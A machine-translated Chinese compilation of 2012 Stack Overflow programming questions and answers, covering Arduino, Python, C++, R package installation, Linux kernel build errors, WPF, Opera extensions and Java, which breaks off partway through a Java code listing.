# compilation - 据称 Arduino 草图正在编译/上传，但在使用 Putty 检查 COM 端口时似乎无法正常工作

> ID：10772276
> 
> 赞同：3
> 
> 时间：2012-05-27T07:11:10.070
> 
> 标签：compilation, serial-port, arduino, putty

我刚开始使用 arduino uno，我之前加载了一个程序，该程序从一堆传感器接收信息并通过串行输出接收到的信息。因此，当我使用腻子从 COM3（如在我的计算机上）连接到 UNO 时，它会输出传感器读数。

但是我现在遇到了一个问题，就是用一个空草图重置 UNO

```
void setup(){}
void loop(){} 
```

当我上传上面的内容时，它说已编译，但是当我连接腻子时，旧程序似乎仍然处于活动状态？

关于这里出了什么问题的任何想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-31T19:05:47.513

确保在上传之前关闭 putty，因为它可能会阻止 IDE 和 Arduino 之间的通信。

不仅要检查编译，还要检查上传。在开发过程中使用来自 Arduino IDE 的序列号。编译过程知道如何杀死它，并且会自动完成。

# python - Python：意外的令牌

> ID：10772277
> 
> 赞同：0
> 
> 时间：2012-05-27T07:11:14.733
> 
> 标签：python, lambda

```
min(gameinfo.not_my_planets.values(), key=lambda p: p if p.num_ships < 35) 
```

试图获得最小的星球，但只有在有 35 艘或更少船只的星球时。

尽管有任何想法，但得到意想不到的令牌')'？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:30:58.687

您错过`else`了 lambda 表达式的一部分，但您最好将其重写为：

```
min(filter(lambda p: p.num_ships < 35, gameinfo.not_my_planets.values())) 
```

`filer(...)`会将行星的序列减少到具有`num_ships < 35`. 物体之间是否`planet`具有可比性，还是应该与属性行星进行比较 `planet.size`？如果是这样，您必须添加另一个 lambda：

```
min(filter(lambda p: p.num_ships < 35, gameinfo.not_my_planets.values()), key=lambda p:p.size) 
```

如果你**不习惯函数式构造**，只需使用简单的列表理解（我假设行星在它们之间是可比较的）：

```
min( p for p in gameinfo.not_my_planets.values() if p.num_ships < 35) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-27T07:41:42.417

我不确定那个 lambda 的意义是什么......按照你在对另一个答案的评论中所说的你想要的：

要“选择拥有 35 艘或更多船的行星”：

```
planets_35_or_higher = [p for p in gameinfo.not_my_planets.values() 
                        if p.num_ships >= 35]) 
```

要“选择其余的最小值”：

```
planets_below_35 = [p for p in gameinfo.not_my_planets.values() 
                    if p.num_ships < 35])
min_planet_below_35 = min(planets_below_35) 
```

或者，如果行星对象没有比较运算符，则给`min`a 函数以获取它应该用于比较的属性，如下所示：

```
min_planet_below_35 = min(planets_below_35, key=lambda p: p.num_ships) 
```

此外，为了处理没有 35 艘以下船只的行星的可能性：

```
if planets_below_35:
    min_planet_below_35 = min(planets_below_35)
else:
    # do something else 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-27T07:17:35.987

`p if p.num_ships < 35`其本身是无效的语法。如果 lambda 应该返回`p.num_ships >= 35`什么？您需要使用`else`;来完成它 例如`p is p.num_ships < 35 else ...`。`key`for 参数中的要点`min`是为每个元素选择一个值，根据该值应该确定最小元素。

“仅当有 35 艘或更少船的行星时”是什么意思？你的意思是说，如果所有行星都有超过 35 艘船，那么你根本不想要一个最小行星吗？

# c++ - 如何在 C++ 中创建一个没有路径名的文件夹，只有要创建的文件夹的名称？

> ID：10772278
> 
> 赞同：4
> 
> 时间：2012-05-27T07:11:18.430
> 
> 标签：c++, file

> **可能重复：**
> [在 C 或 C++ 中创建目录](https://stackoverflow.com/questions/2256913/creating-a-directory-in-c-or-c)

我想创建一个名为“BobtheBuilder”的文件夹。然后我想在其中创建一个文本文件。我想在不知道我的路径的情况下做到这一点。我不想输入：

```
ofstream out("C:/MyComputer/User/Jeff/etc/BobtheBuilder/NewFile.txt"); 
```

我希望它只是在这个包含我的可执行文件的区域的本地，如下所示：

```
ofstream out("/BobtheBuilder/NewFile.txt"); 
```

这可能吗？我必须知道整个路径名才能进行文件管理吗？我觉得这是可能的，因为您可以创建或打开与程序位于同一目录中的文件，例如：

```
ifstream inf("NewFile.txt"); 
```

或者是否有一个特殊的关键字来填充以前的路径，如下所示：

```
ifstream inf("FILLIN/BobtheBuilder/NewFile.txt"); 
```

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-27T07:30:05.500

您完全可以指定一个相对路径，例如*“BobtheBuilder/NewFile.txt”*，而无需指定整个路径。但是，您需要先创建文件夹，然后再创建文件。由于创建文件夹是特定于平台的，而且您使用的是 Windows，因此您需要调用*CreateDirectory*函数，并将*“BobtheBuilder”*作为其参数。然后将在程序的默认工作目录中创建该文件夹，该目录与可执行文件所在的文件夹相同。您可以在创建文件夹和文件之前使用*SetCurrentDirectory*函数更改此工作目录。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T09:40:29.000

要创建目录，您可以使用 C 函数：

```
int mkdir(const char *pathname, mode_t mode); 
```

如果你可以使用[Boost](http://www.boost.org/)，那么它真的变得更容易和更 C++ 友好：

```
bool create_directories(const path& p);

// usage example
boost::filesystem::create_directories("./BobtheBuilder"); 
```

正如您在问题中提到的，您可以使用绝对路径和相对路径。这仅取决于您的意图。在你的情况下，你可以这样做：

```
boost::filesystem::create_directories("./BobtheBuilder");
ofstream out("./BobtheBuilder/NewFile.txt"); 
```

根本不需要指定绝对路径。

如果你经常需要管理路径，Boost 提供了很多有用的路径管理工具。举个例子，考虑您在问题中提到的问题：您想要获取当前目录的完整路径，然后附加一个相对路径。你可以很容易地做到这一点：

```
 #include <boost/filesystem.hpp>
 namespace fs = boost::filesystem;
 ...
 fs::path curr_abs_path = fs::current_path();
 fs::path rel_path = "foo/bar";
 fs::path combined = (curr_abs_path /= rel_path);
 cout << combined << endl; 
```

假设当前目录是 /tmp/ 前面的代码片段将打印：

> /tmp/foo/bar

`operator/=`负责追加两条路径并返回组合结果。

# rdf - 在 Smalltalk 中解析 RDF

> ID：10772281
> 
> 赞同：7
> 
> 时间：2012-05-27T07:12:42.020
> 
> 标签：rdf, smalltalk, squeak, pharo, visualworks

是否有任何 Smalltalk 风格的示例，显示如何解析 RDF 文件？我见过的唯一包是带有[RDFXMLReader](http://www.squeaksource.com/Rikaiko.html)类的 Rikaiko，但没有参考，而且似乎没有记录。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-30T16:06:03.943

不久前我也在寻找类似的东西。Rikaiko 是关于它，但我还没有时间真正看看它。这些是我得到的与 Pharo 和 Moose 相关的一些答案。

[http://lists.gforge.inria.fr/pipermail/pharo-project/2012-February/059235.html](http://lists.gforge.inria.fr/pipermail/pharo-project/2012-February/059235.html) 截至 2012-02-07

> 我不知道 Pharo 中的 RDF 支持。但是，拥有一个肯定会很酷，尤其是在 Moose 的背景下。如果Rakaiko有它，我会感兴趣的。让我们知道你发现了什么。
> 
> 关于 XML，比较成熟的解决方案是 XMLSupport。PetitXml 很好，因为它基于 PetitParser，它是 Moose 中的中央解析引擎，所以从长远来看，我更喜欢使用这个。但是，像 XPath 这样的附属库或对对象工厂的支持尚不可用。——都铎·吉尔巴

# javascript - Google maps Places API V3 自动完成 - 在输入时选择第一个选项（并保持这种状态）

> ID：10772282
> 
> 赞同：6
> 
> 时间：2012-05-27T07:12:59.433
> 
> 标签：javascript, google-maps, google-maps-api-3, autocomplete

这个问题与这个问题的答案有关：[Google maps Places API V3 autocomplete - select first option on enter](https://stackoverflow.com/questions/7865446/google-maps-places-api-v3-autocomplete-select-first-option-on-enter)。基本上，它是让该字段在用户按下回车时使用自动完成列表中的第一个建议。该问题的答案有一个 jsfiddle - [http://jsfiddle.net/dodger/pbbhH/](http://jsfiddle.net/dodger/pbbhH/) - 除非文本字段失去焦点，否则字段值将返回到部分输入的值。

例如，用户在输入字段中单击并键入“ox”，自动完成框会弹出一些建议，然后用户按下回车键。然后更改地图以显示自动完成框中第一项的位置（带有标记），并且输入字段的值更改为自动完成框中的第一项。然后，用户单击字段外的某处，输入字段的值返回“ox”。

我希望输入字段的值保留为第一个自动完成建议。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-27T07:43:06.637

试试这个：http: [//jsfiddle.net/pbbhH/60/](http://jsfiddle.net/pbbhH/60/)

基本上将选择逻辑抽象为一个新函数**selectFirstResult()**。然后在按下回车键和失去对文本的焦点时调用此函数。

```
 function selectFirstResult() {
    infowindow.close();
    var firstResult = $(".pac-container .pac-item:first").text();

    var geocoder = new google.maps.Geocoder();
    geocoder.geocode({"address":firstResult }, function(results, status) {
        if (status == google.maps.GeocoderStatus.OK) {
            var lat = results[0].geometry.location.lat(),
                lng = results[0].geometry.location.lng(),
                placeName = results[0].address_components[0].long_name,
                latlng = new google.maps.LatLng(lat, lng);

            moveMarker(placeName, latlng);
            $("input").val(firstResult);
        }
    });   
 } 
```

**编辑：**根据@Ben 下面的评论进行了微小的更改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-03T12:15:39.230

这是正确的，但如果你按下回车键并且你已经选择了一个项目，这将选择第一个。所以使用这个代码：

```
function selectFirstResult() {
infowindow.close();
if ( $('.pac-selected').length < 0){ // this line

var firstResult = $(".pac-container .pac-item:first").text();
var geocoder = new google.maps.Geocoder();
geocoder.geocode({"address":firstResult }, function(results, status) {
    if (status == google.maps.GeocoderStatus.OK) {
        var lat = results[0].geometry.location.lat(),
            lng = results[0].geometry.location.lng(),
            placeName = results[0].address_components[0].long_name,
            latlng = new google.maps.LatLng(lat, lng);

        moveMarker(placeName, latlng);
        $("input").val(firstResult);
    }
});
}   
} 
```

# algorithm - 了解这种 NP 完全优化吗？

> ID：10772290
> 
> 赞同：1
> 
> 时间：2012-05-27T07:14:19.447
> 
> 标签：algorithm, search, optimization

有没有人见过这个问题？它应该是NP完全的。

> 我们得到顶点 V_1,...,V_n 和每个顶点的可能父集。每个父集都有相关的成本。令 O 为顶点的排序（排列）。如果所有的父节点都在排序中的顶点之前，我们说顶点 V_i 的父集与排序 O 一致。令 mcc(V_i, O) 为与排序 O 一致的顶点 V_i 的父集的最小成本。我需要找到一个最小化总成本的排序 O：mcc(V_1, O), ... ,mcc( V_n, O)。

我不太明白“......如果所有父母都在排序中的顶点之前”这部分。这是什么意思？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T07:22:02.957

不，我以前没见过这个问题。

至于你不确定的一点——排序只是所有顶点的顺序，所以我认为“如果所有父母都在排序中的顶点之前”就是它所说的。例如，假设 (A, B) 是 D 的一个父集：该父集与排序 [A,B,C,D] 一致，因为 A 和 B 在 D 之前，并且与排序 [A ,D,B,C]，因为 B 在 D 之后；但是，假设 (A) 是 D 的另一个父集 - 一个与这两个顺序一致。那有意义吗？

# php - 编码转换PHP

> ID：10772297
> 
> 赞同：0
> 
> 时间：2012-05-27T07:15:53.973
> 
> 标签：php, encoding

我需要编码方面的帮助 :( 我已从站点解析字符串：Ëè÷íûå âñòðå÷è 我的站点采用 UTF-8 编码。

如何将解析的字符串转换为我网站的编码？在这个网站 artlebedev.ru/tools/decoder 当我点击“Расшифровать”按钮时，我得到正确的结果：Личные встречи。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-27T08:40:39.247

尝试这个

```
echo iconv("cp1251","utf8",iconv("utf8","cp1252","Ëè÷íûå âñòðå÷è")); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-27T08:03:29.040

你说这行不通？

```
echo iconv("iso-8859-5","utf-8","Ëè÷íûå âñòðå÷è"); 
```

那你确定你的**文件**也是 utf8 吗？

# r - R: rpm 文件可以与 Windows 一起用于可能过时的 R 包吗？

> ID：10772298
> 
> 赞同：0
> 
> 时间：2012-05-27T07:16:07.393
> 
> 标签：r

我试图运行需要 R 包“pkgDepTools”和“Rgraphviz”的代码。我收到错误消息，说这两个包都不适用于 R 版本 2.15.0。

谷歌搜索出现了以下网页 RPM Pbone，它似乎包含这些软件包：

[http://rpm.pbone.net/index.php3/stat/4/idpl/17802118/dir/mandrake_other/com/R-pkgDepTools-1.20.0-1-mdv2012.0.i586.rpm.html](http://rpm.pbone.net/index.php3/stat/4/idpl/17802118/dir/mandrake_other/com/R-pkgDepTools-1.20.0-1-mdv2012.0.i586.rpm.html)

和

[http://rpm.pbone.net/index.php3/stat/4/idpl/17802080/dir/mandrake_other/com/R-Rgraphviz-1.32.0-2-mdv2012.0.i586.rpm.html](http://rpm.pbone.net/index.php3/stat/4/idpl/17802080/dir/mandrake_other/com/R-Rgraphviz-1.32.0-2-mdv2012.0.i586.rpm.html)

但是，这些文件具有 *.rpm 扩展名，而不是我习惯的 *.tar.gz 或 *.zip 扩展名。

我使用的是 Windows 7 和 R 版本 2.15.0。我可以从 *.rpm 文件安装 R 包吗？

来自 Wikipedia *.rpm 似乎更适合 Linux：

[http://en.wikipedia.org/wiki/RPM_Package_Manager](http://en.wikipedia.org/wiki/RPM_Package_Manager)

关于其他可能的解决方案，我在这里找到了几个较早的帖子，其中包含有关安装 R 包的类似问题，这些包不适用于最新版本的 R：

[R中的双变量泊松回归？](https://stackoverflow.com/questions/10180631/bivariate-poisson-regression-in-r#comment13067201_10180631)

[包“GeneR”不可用](https://stackoverflow.com/questions/9813320/package-gener-is-not-available)

[R 维恩图包尊敬的不可用 - 替代包？](https://stackoverflow.com/questions/6009222/r-venn-diagram-package-venerable-unavailable-alternative-package)

我已经安装了最新版本的 Rtools 和包“devtools”。虽然我对他们一无所知。

这里有一个“Rgraphviz”的存档版本：

[http://cran.r-project.org/src/contrib/Archive/Rgraphviz/](http://cran.r-project.org/src/contrib/Archive/Rgraphviz/)

但我找不到“pkgDepTools”的存档版本。

如果我可以使用上述 *.rpm 文件在 Windows 机器上安装软件包，有人可以提供说明吗？

如果我必须使用 Rtools 来构建它们，我可能会问更多问题，因为下面链接中的说明对我来说具有挑战性：

[http://cran.r-project.org/doc/manuals/R-admin.html#Building-from-source](http://cran.r-project.org/doc/manuals/R-admin.html#Building-from-source)

为了完全透明，如果可能的话，我希望有人可以为我建造它们。虽然我认识到自己从做这件事中获得的经验和知识从长远来看可能会有所回报。

谢谢你的任何建议。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-27T08:15:25.853

**[pkgDepTools](http://www.bioconductor.org/packages/2.9/bioc/html/pkgDepTools.html)**和**[Rgraphviz](http://www.bioconductor.org/packages/2.9/bioc/html/Rgraphviz.html)**是 BioConductor R 软件包，不是托管在 CRAN 上的。除非您将 R 配置为从这些存储库下载包，否则 R 将报告它们不可用；它只能从已配置安装的 repos 安装。

要安装这些 BioConductor 软件包，提供了一种精简的安装方法：

```
source("http://bioconductor.org/biocLite.R")
biocLite(c("pkgDepTools", "Rgraphviz")) 
```

[BioConductor 网站的](http://www.bioconductor.org/install/)[**安装**](http://www.bioconductor.org/install/)页面提供了更多详细信息[](http://www.bioconductor.org/install/)

 **一般来说，你不能在 Windows 上使用 rpm 包；rpm 相当于 Linux 的二进制包。任何 C/C++/Fortran/etc 代码都将针对 Linux 而不是 Windows 进行编译。如果某个包确实不适用于您的 R 版本，请检查 CRAN 上是否说明了原因（通常 Windows 二进制文件需要几天的时间才能生成，或者可能存在对 CRAN Windows 构建机器上不可用的软件的要求） . 您可以尝试由 Uwe Ligges 运行的 WinBuilder 服务来为您构建包的 Windows 二进制文件，但如果包在 CRAN 上并且现在不表明它不再适用于当前的 R 并且无法构建。

一般来说，尝试更广泛地搜索包；在我的 Google 搜索结果中，搜索字符串“pkgDepTools”下的第一个命中是该软件包的 Bioconductor 页面，其中包括指向 Windows 二进制文件的链接**以及**有关如何从 R 中安装该软件包的说明。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-28T21:24:58.357

我认为这值得一个答案而不是评论。

Bioconductor 的一位绅士帮助我安装了 Rgraphviz。主要问题是我下载的 Rgraphviz 版本似乎只适用于 32 位版本的 R，而我运行的是 64 位版本的 R。我能够在 32 位版本的 R 中安装 Rgraphviz .

在我尝试安装 Rgraphviz 的一些过程中，我还在 PATH 语句中犯了一个或两个错误。但是，我第二条评论中的上述帖子提供了安装说明。

You just, it seems, cannot install the normal download version of Rgraphviz in the 64-bit version of R.

I think many of our emails back and forth are now posted on the Bioconductor forum.

I might edit this answer with more detailed instructions in the next 24-hours.**

# python - Python - abs 与 fabs

> ID：10772302
> 
> 赞同：114
> 
> 时间：2012-05-27T07:16:39.897
> 
> 标签：python

我注意到在 python 中有两种类似的查找数字绝对值的方法：

第一的

```
abs(-5) 
```

第二

```
import math
math.fabs(-5) 
```

这些方法有何不同？

* * *

## 回答 #1

> 赞同：134
> 
> 时间：2012-05-27T07:21:00.373

[`math.fabs()`](https://docs.python.org/2/library/math.html#math.fabs)如果可以，则将其参数转换为浮点数（如果不能，则抛出异常）。然后它取绝对值，并将结果作为浮点数返回。

除了浮点数，[`abs()`](https://docs.python.org/2/library/functions.html#abs)也适用于整数和复数。它的返回类型取决于其参数的类型。

```
In [7]: type(abs(-2))
Out[7]: int

In [8]: type(abs(-2.0))
Out[8]: float

In [9]: type(abs(3+4j))
Out[9]: float

In [10]: type(math.fabs(-2))
Out[10]: float

In [11]: type(math.fabs(-2.0))
Out[11]: float

In [12]: type(math.fabs(3+4j))
---------------------------------------------------------------------------
TypeError                                 Traceback (most recent call last)
/home/npe/<ipython-input-12-8368761369da> in <module>()
----> 1 type(math.fabs(3+4j))

TypeError: can't convert complex to float 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-27T07:22:47.263

编辑：正如@a​​ix 所建议的，一种更好（更公平）的比较速度差异的方法：

```
In [1]: %timeit abs(5)
10000000 loops, best of 3: 86.5 ns per loop

In [2]: from math import fabs

In [3]: %timeit fabs(5)
10000000 loops, best of 3: 115 ns per loop

In [4]: %timeit abs(-5)
10000000 loops, best of 3: 88.3 ns per loop

In [5]: %timeit fabs(-5)
10000000 loops, best of 3: 114 ns per loop

In [6]: %timeit abs(5.0)
10000000 loops, best of 3: 92.5 ns per loop

In [7]: %timeit fabs(5.0)
10000000 loops, best of 3: 93.2 ns per loop

In [8]: %timeit abs(-5.0)
10000000 loops, best of 3: 91.8 ns per loop

In [9]: %timeit fabs(-5.0)
10000000 loops, best of 3: 91 ns per loop 
```

所以它似乎`abs()`只比整数有轻微的速度优势`fabs()`。对于花车，`abs()`并`fabs()`展示类似的速度。

* * *

除了@aix 所说的，还要考虑的另一件事是速度差异：

```
In [1]: %timeit abs(-5)
10000000 loops, best of 3: 102 ns per loop

In [2]: import math

In [3]: %timeit math.fabs(-5)
10000000 loops, best of 3: 194 ns per loop 
```

所以`abs()`比`math.fabs()`.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-05-27T07:22:24.930

`math.fabs()`总是返回浮点数，而`abs()`可能返回整数。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-02-05T13:46:21.100

`abs()`：根据参数返回绝对值，即如果参数是int则返回int，如果参数是float则返回float。它也适用于复杂变量，即`abs(a+bj)`也适用并返回绝对值，即`math.sqrt(((a)**2)+((b)**2)`

`math.fabs()`：它仅适用于整数或浮点值。无论参数类型是什么（复数除外），始终返回绝对浮点值。

# asp.net - 消除对显示 devexpress 弹出窗口的关注

> ID：10772303
> 
> 赞同：0
> 
> 时间：2012-05-27T07:16:43.340
> 
> 标签：asp.net, user-controls, devexpress

我在我的 ASP.Net 项目中使用`Devexpress`UserControls 来显示、编辑和删除数据行。

在我的一个页面上，我有两个控件，一个`DevExpress grid`和一个`ASP.Net button`。当我想编辑一行时，我单击该行的编辑按钮，然后会显示一个显示该行详细信息的弹出窗口。我可以编辑这些详细信息，然后采取一些行动。这个弹出窗口有按钮*Cancel*和*Save*，当我按下*Enter*键时，我希望调用*Save操作。*但是，目前，当我按*Enter*键时，它会被定向到主页而不是对话框？

有谁知道我如何获得*Enter*键来激活对话框上的*Save操作？*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-04T17:13:55.763

查看以下示例以了解有关如何处理文档事件和响应特定最终用户操作的更多信息：

[E352](http://www.devexpress.com/example=E352)

[E3845](http://www.devexpress.com/example=E3845)

# java - JSP request.getParameter 字符串

> ID：10772312
> 
> 赞同：1
> 
> 时间：2012-05-27T07:18:08.880
> 
> 标签：java, string, jsp

我在 JSP 中有以下页面：

```
<%
    String req = request.getParameter("req");

    if (req == "Start")
        // Do something here
%>

<form>
    <input type="submit" name="req" value="Start" />
</form> 
```

但是当我按下*Start*按钮时，似乎*req*值不等于*Start*，并且代码没有进入*if*语句。

有什么问题？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-05-27T07:20:43.270

你应该写

```
 if (req != null && req.equals("Start")) 
```

代替

```
 if (req == "Start") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-27T09:11:08.993

采用 `if("Start".equals(request.getParameter("req")))`

即使 request.getParameter("req") 为空，您也不会收到任何错误。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-28T06:45:21.243

`if (req == "Start")`比较这两个对象的引用，这就是您不进入 if 块的原因。`equals()`使用比较值而不是引用的String 类方法。

# linux-kernel - 如何解决'drivers/net/igbvf/igbvf.h:129:15: error: duplicate member 'page''？

> ID：10772319
> 
> 赞同：2
> 
> 时间：2012-05-27T07:20:37.553
> 
> 标签：linux-kernel

我使用 ubuntu 11.10 64 位并运行：

```
 sam@sam:~/download/kernel/linux-2.6.37.6$ make
    CHK     include/linux/version.h
    CHK     include/generated/utsrelease.h
    CALL    scripts/checksyscalls.sh
    CHK     include/generated/compile.h
    VDSOSYM arch/x86/vdso/vdso-syms.lds
    VDSOSYM arch/x86/vdso/vdso32-int80-syms.lds
    VDSOSYM arch/x86/vdso/vdso32-syscall-syms.lds
    VDSOSYM arch/x86/vdso/vdso32-sysenter-syms.lds
    VDSOSYM arch/x86/vdso/vdso32-syms.lds
    LD      arch/x86/vdso/built-in.o
    LD      arch/x86/built-in.o
    CC [M]  drivers/net/igbvf/ethtool.o
  In file included from drivers/net/igbvf/ethtool.c:36:0:
  drivers/net/igbvf/igbvf.h:129:15: error: duplicate member 'page'
  make[3]: *** [drivers/net/igbvf/ethtool.o] Error 1
  make[2]: *** [drivers/net/igbvf] Error 2
  make[1]: *** [drivers/net] Error 2
  make: *** [drivers] Error 2
  sam@sam:~/download/kernel/linux-2.6.37.6$ 
```

如何解决？

谢谢~

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-10-14T11:29:09.177

```
------------------------------------------------------------------------------------------------------
PROBLEM:-1
------------------------------------------------------------------------------------------------------
gcc: error: elf_i386: No such file or directory
OBJCOPY arch/x86/vdso/vdso32-int80.so
objcopy: 'arch/x86/vdso/vdso32-int80.so.dbg': No such file
make[2]: *** [arch/x86/vdso/vdso32-int80.so] Error 1
make[1]: *** [arch/x86/vdso] Error 2
make: *** [arch/x86] Error 2
------------------------------------------------------------------------------------------------------
SOLUTION:
----------
The problem is that gcc 4.6 doesn't support anymore linker-style architecture options.
Apply the following changes to solve the problem :
In arch/x86/vdso/Makefile :
replace "-m elf_x86_64" by "-m64" on the line starting with VDSO_LDFLAGS_vdso.lds
replace "-m elf_i386" by "-m32" on the line starting with VDSO_LDFLAGS_vdso32.lds
------------------------------------------------------------------------------------------------------
PROBLEM:-2
------------------------------------------------------------------------------------------------------
In file included from drivers/net/igbvf/ethtool.c:36:0:
drivers/net/igbvf/igbvf.h: At top level:
drivers/net/igbvf/igbvf.h:129:15: error: duplicate member ‘page’
make[3]: *** [drivers/net/igbvf/ethtool.o] Error 1
make[2]: *** [drivers/net/igbvf] Error 2
make[1]: *** [drivers/net] Error 2
make: *** [drivers] Error 2
------------------------------------------------------------------------------------------------------
SOLUTION:
---------
struct igbvf_buffer {
dma_addr_t dma;
struct sk_buff *skb;`enter code here`
union {
/* Tx */
struct {
unsigned long time_stamp;
u16 length;
u16 next_to_watch;
u16 mapped_as_page;
};
/* Rx */
struct {
struct page *page; <--------------- No 1
u64 page_dma;
unsigned int page_offset;
};
};
struct page *page; <------------ No 2
};
Hmm conflict of a member with a transparent union.
Maybe older gccs didn't catch that. But it looks very broken
Comment second pointer.
------------------------------------------------------------------------------------------------------
PROBLEM 3: Similar to Problem-2
-------------------------------------------------------------------------------
In file included from drivers/scsi/pmcraid.c:57:0:
drivers/scsi/pmcraid.h: At top level:
drivers/scsi/pmcraid.h:601:8: error: duplicate member ‘sense_buffer’
drivers/scsi/pmcraid.c: In function ‘pmcraid_abort_cmd’:
drivers/scsi/pmcraid.c:2940:33: warning: variable ‘res’ set but not used [-Wunused-but-set-variable]
drivers/scsi/pmcraid.c: In function ‘pmcraid_ioctl_passthrough’:
drivers/scsi/pmcraid.c:3745:5: warning: variable ‘access’ set but not used [-Wunused-but-set-variable]
drivers/scsi/pmcraid.c: In function ‘pmcraid_check_ioctl_buffer’:
drivers/scsi/pmcraid.c:4052:6: warning: variable ‘access’ set but not used [-Wunused-but-set-variable]
make[3]: *** [drivers/scsi/pmcraid.o] Error 1
make[2]: *** [drivers/scsi] Error 2
make[1]: *** [drivers] Error 2
make[1]: Leaving directory `/home/ashish/litmus-rt'
make: *** [debian/stamp/build/kernel] Error 2
-------------------------------------------------------------------------------
SOLUTION:
----------
Comment drivers/scsi/pmcraid.h:571
------------------------------------------------------------------------------- 
```

# wpf - WPF DataGrid 双向绑定

> ID：10772320
> 
> 赞同：4
> 
> 时间：2012-05-27T07:20:40.000
> 
> 标签：wpf, xaml, data-binding

我有`UserSet`包含 from的财产`ObservableCollection<GridRow>`。 `GridRow`- 我的课程，其中包含 4 个这样的属性：

```
public int Id
{
    get { return id; }
    set
    {
        id = value;
        RaisePropertyChanged("Id");
    }
} 
```

我填充 UserSet，然后 Grid 绑定到它。当我更改`id`字段工作设置器时`Id`。它设定了正确的价值观。但是，在所有更改之后，当我单击其他按钮时，我`UserSet`并没有修改值。所以我无法获得更新的网格。这是我的 XAML：

```
<DataGrid ItemsSource="{Binding UsersSet, Mode=TwoWay}" AutoGenerateColumns="True">

</DataGrid> 
```

请帮忙。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-27T07:53:19.763

您可以尝试设置`UpdateSourceTrigger`：

```
<DataGrid ItemsSource="{Binding UsersSet, 
                        Mode=TwoWay, 
                        UpdateSourceTrigger=PropertyChanged}" 
          AutoGenerateColumns="True">

</DataGrid> 
```

在不知道其余代码的情况下，很难猜到。

# javascript - 通过 config.xml 的 Opera 扩展首选项

> ID：10772322
> 
> 赞同：0
> 
> 时间：2012-05-27T07:20:44.007
> 
> 标签：javascript, widget, opera, preferences, opera-extension

我在扩展的 config.xml 文件中定义了 2 个首选项：

```
<preference name="interval" value="1800" readonly="false" />
<preference name="pcount" value="5" readonly="false" /> 
```

当我使用以下内容在 background.js 脚本中检索这些值时：

```
interval = widget.preferences.getItem("interval")
pcount = widget.preferences.getItem("pcount") 
```

*interval*和*pcount*变量的值变为“null”，而不是 1800 和 5。

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T18:38:20.713

我不确定您是否需要 getItem 方法，因为您可以使用

```
widget.preferences["interval"] 
```

但即使该方法返回`null`。

似乎通过 config.xml 简单地设置首选项不起作用。尝试`console.log(widget.preferences)`，那里不会有你的设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-21T21:07:39.457

回答我自己的问题：
这似乎是一个 Opera 怪癖。经过一些实验，我发现如果您重新启动 Opera（添加扩展名后），widget.preferences 似乎可以存储和检索值。有时您必须再次卸载并安装扩展程序。有时您必须清除缓存。有时你必须做所有事情。

# iphone - 如何为不同的按钮操作设置单个选择器视图

> ID：10772327
> 
> 赞同：0
> 
> 时间：2012-05-27T07:21:27.677
> 
> 标签：iphone, objective-c, ios, uipickerview

我有三个不同的按钮。当我单击这些按钮时，它会显示一个选择器视图。我每次都使用相同的选择器视图，但选择器视图中的行应该不同，具体取决于按下的按钮。

如何根据按下的按钮使选择器视图显示我想要的行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-27T08:00:42.820

我假设您使用 UIPickerView 并且该 pickerView 的委托与您的按钮所在的 viewController 相同。我将创建 4 个数组，每个按钮 3 个，其中的值显示在选择器中，1 个数组由`– pickerView:titleForRow:forComponent:`

```
NSArray *pickerData;
NSArray *button1Data;
NSArray *button2Data;
NSArray *button3Data; 
```

然后在按钮的 IBActions 中（或者在代码中设置目标和选择器）

```
- (IBAction)button1Action:(id)sender {
    [pickerData release];
    pickerData = [button1Data retain];
}

- (IBAction)button2Action:(id)sender {
    [pickerData release];
    pickerData = [button2Data retain];
}

etc... 
```

在`– pickerView:titleForRow:forComponent:`你使用 pickerData 来显示你的值

我希望这是有道理的

# java - 如何从iso获取国家电话前缀

> ID：10772329
> 
> 赞同：14
> 
> 时间：2012-05-27T07:22:13.730
> 
> 标签：java, android

[我通过这个答案](https://stackoverflow.com/questions/3659809/where-am-i-get-country)的代码得到了国家iso ：

```
TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
String countryCode = tm.getSimCountryIso(); 
```

如何获取国家/地区的前缀电话号码？
例如 +972 表示 il。

* * *

## 回答 #1

> 赞同：41
> 
> 时间：2012-05-27T17:56:01.423

我找到了一个可以在 csv 文件中获取映射的地方。[检查这里。](http://www.andrewpatton.com/countrylist.html)

另外，我将其更改为将国家代码转换为电话前缀的类。这里是：

```
public class Iso2Phone {
public static String getPhone(String code) {
    return country2phone.get(code.toUpperCase());
}
public static Map<String, String> getAll(){
    return country2phone;
}
private static Map<String, String> country2phone = new HashMap<String, String>();
static {
    country2phone.put("AF", "+93");
    country2phone.put("AL", "+355");
    country2phone.put("DZ", "+213");
    country2phone.put("AD", "+376");
    country2phone.put("AO", "+244");
    country2phone.put("AG", "+1-268");
    country2phone.put("AR", "+54");
    country2phone.put("AM", "+374");
